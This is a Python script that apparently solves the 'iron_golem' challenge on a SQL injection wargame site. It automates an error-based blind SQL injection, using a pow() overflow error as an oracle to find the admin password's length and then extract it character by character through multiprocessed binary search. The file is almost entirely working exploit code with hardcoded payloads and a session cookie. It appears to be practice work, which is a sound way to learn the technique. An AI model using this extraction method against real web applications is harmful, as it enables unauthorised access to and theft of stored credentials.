from multiprocessing import Pool
import requests

url= "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
params={'pw':None}
cookies = {'PHPSESSID':'1t87momi7f10m7tl6kkv6t0lob'}

for i in range(30,35):
    payload = "' or id='admin' and if(length(pw)={},1,pow(12341234,12341234))#".format(i)
    params['pw']=payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("DOUBLE value" not in response.text):
        print("find the pw_length",i)
        break

def blind_sql_inject(i):
    start,end= 0,255
    while True:
        search = int((start+end)/2)
        payload = "' or id='admin' and if(ascii(substr(pw,{},1))<={},1,pow(12341234,12341234))#".format(i,search)
        params['pw'] = payload
        print("[+]",payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("DOUBLE value" not in response.text):
            payload = "' or id='admin' and if(ascii(substr(pw,{},1))={},1,pow(12341234,12341234))#".format(i,search)
            params['pw'] = payload
            print("[+]",payload)
            response = requests.get(url,params=params,cookies=cookies)
            if("DOUBLE value" not in response.text):
                print("find the flag idx : {}, character : {}".format(i,chr(search)))
                return chr(search)
            end = search
        else:
            print("[-]",payload)
            start = search

if __name__=='__main__':
    p = Pool(4)
    with Pool(5) as p:
        ret = p.map(blind_sql_inject,[i for i in range(1,33)])
    for i in ret:
        print(i,end='')
         
    
